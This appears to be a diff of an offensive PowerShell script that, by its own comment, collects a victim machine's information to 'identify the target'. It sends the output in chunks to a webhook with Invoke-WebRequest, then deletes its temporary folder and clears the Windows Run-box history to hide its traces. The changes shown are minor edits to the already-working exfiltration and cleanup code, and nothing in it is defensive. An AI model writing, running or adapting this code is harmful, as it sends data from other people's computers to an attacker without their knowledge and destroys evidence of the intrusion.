@@ -1,7 +1,7 @@
 #This will grab just the computer Info and send it to a webhook so you can identify the target
 
 $D="$env:tmp";
-cd $D\pass;
+cd $D\pass
 
 $FileName = "${Date}${env:computername}_${Time}.txt";
 
@@ -22,12 +22,12 @@ $statOutput = $args1 | Out-String;
     $chunks = [Math]::Ceiling($statOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $statOutput.Length - $start);$content = $statOutput.Substring($start, $length); 
     $webhookContent = @{'username' = 'V1Ru7EnT';'content' = $content;};  
     $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};
-
+    
 ########################################################################################################################################################################
 
 cd\
 # empty temp folder
-rm $D\pass -r -Force -ErrorAction SilentlyContinue
+rm $D\pass* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
